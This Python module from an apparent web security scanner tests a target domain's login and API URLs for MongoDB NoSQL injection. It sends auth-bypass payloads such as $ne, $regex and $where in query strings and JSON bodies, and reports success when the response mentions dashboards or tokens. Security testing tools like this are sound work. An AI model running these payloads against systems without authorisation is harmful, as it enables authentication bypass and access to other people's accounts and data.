"""
modules/nosql.py
----------------
NoSQL injection (MongoDB primary).
Tests query-string and JSON body injection.
"""

import json
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("nosql")


QUERY_PAYLOADS = [
    ("[$ne]=1", "auth bypass"),
    ("[$gt]=", "greater than"),
    ("[$regex]=.*", "regex injection"),
    ("[$exists]=true", "exists bypass"),
]

JSON_PAYLOADS = [
    ({"username": {"$ne": "x"}, "password": {"$ne": "x"}}, "auth bypass"),
    ({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}, "regex bypass"),
    ({"$where": "1==1"}, "$where injection"),
]


def test_query_string(url: str) -> List[Dict]:
    findings: List[Dict] = []
    p = urlparse(url)
    qs = parse_qs(p.query)
    if not qs:
        return []

    for param in qs:
        for payload, note in QUERY_PAYLOADS:
            try:
                new_qs = dict(qs)
                new_qs[param] = [qs[param][0] + payload]
                new_url = urlunparse((p.scheme, p.netloc, p.path,
                                      p.params, urlencode(new_qs, doseq=True), ""))
            except Exception:
                continue
            r = safe_request(new_url, timeout=10)
            if r and r.status_code == 200:
                if any(k in (r.text or "").lower() for k in
                       ["welcome", "dashboard", "token", "success"]):
                    findings.append({
                        "type": "nosql_injection",
                        "url": new_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Possible auth bypass ({note})",
                        "severity": "critical",
                        "confidence": 55,
                    })
    return findings


def test_json_body(url: str) -> List[Dict]:
    findings: List[Dict] = []
    for payload, note in JSON_PAYLOADS:
        try:
            r = safe_request(url, method="POST",
                             headers={"Content-Type": "application/json"},
                             data=json.dumps(payload), timeout=10)
            if not r:
                continue
            text = (r.text or "").lower()
            if r.status_code == 200 and any(k in text for k in
                    ["welcome", "dashboard", "token", "success"]):
                findings.append({
                    "type": "nosql_injection_json",
                    "url": url,
                    "payload": json.dumps(payload)[:200],
                    "evidence": f"Possible bypass ({note})",
                    "severity": "critical",
                    "confidence": 55,
                })
        except Exception:
            continue
    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "nosql", output_root)
    urls = load_urls(domain, output_root)
    login_urls = [u for u in urls if any(k in u.lower() for k in
                  ["login", "signin", "auth", "user", "account", "api"])]
    if not login_urls:
        login_urls = urls[:30]

    info(f"Testing {len(login_urls)} URLs for NoSQL injection")
    findings: List[Dict] = []

    for url in login_urls[:60]:
        try:
            findings.extend(test_query_string(url))
            findings.extend(test_json_body(url))
        except Exception as e:
            log.debug(f"nosql test failed {url}: {e}")

    for f in findings:
        save_finding(domain, "nosql", f["type"], f["severity"], f["url"],
                     param=f.get("param", ""), payload=f.get("payload", ""),
                     evidence=f["evidence"], confidence=f["confidence"],
                     scan_id=scan_id, output_root=output_root)

    if findings:
        write_lines(mdir / "nosql_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "nosql", run, args.output)